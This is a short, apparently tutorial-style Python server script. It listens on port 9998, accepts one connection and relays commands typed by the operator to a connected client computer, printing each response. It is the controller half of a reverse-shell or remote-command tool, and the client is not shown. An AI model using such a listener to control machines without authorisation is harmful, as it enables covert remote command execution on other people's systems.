"""A python file for the server."""
import socket
import sys

# important functions


def create_socket():
    """Creates a socket to make a connection between two computers."""
    try:
        global host
        global port
        global sockett
        # when global variables are declared, they can be accessed outside the function domain.
        host = ""
        port = 9998
        sockett = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening to connections


def bind_socket():
    """A function to bind sockets and listen for connections."""
    try:
        global host
        global port
        global sockett  # when accessing the values of variables that are globals of other functions, redeclare them.
        print("Binding the port: {}".format(port))

        sockett.bind((host, port))
        sockett.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n\n" + "Retrying...")
        bind_socket()

# Establish connection with the client, provided the socket is listening.


def socket_accept():
    """Accepts the connection and establishes a connection with the client."""
    conn, address = sockett.accept()  # connection object stored in conn, ip information stored in address.
    print("Connection established! \n IP: " + address[0] + "\n Port: " + str(address[1]))
    send_command(conn)
    conn.close()

# Send commands to the client


def send_command(connection):
    """This function sends commands to the client computer."""
    while True:
        command = input().strip()
        if command == "quit":
            connection.close()
            sockett.close()
            sys.exit()
        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            client_response = str(connection.recv(1024), "utf-8")  # basically says convert client response to string
            print(client_response, end="")


def main():
    """A function that calls the functions defined above."""
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == "__main__":
    main()
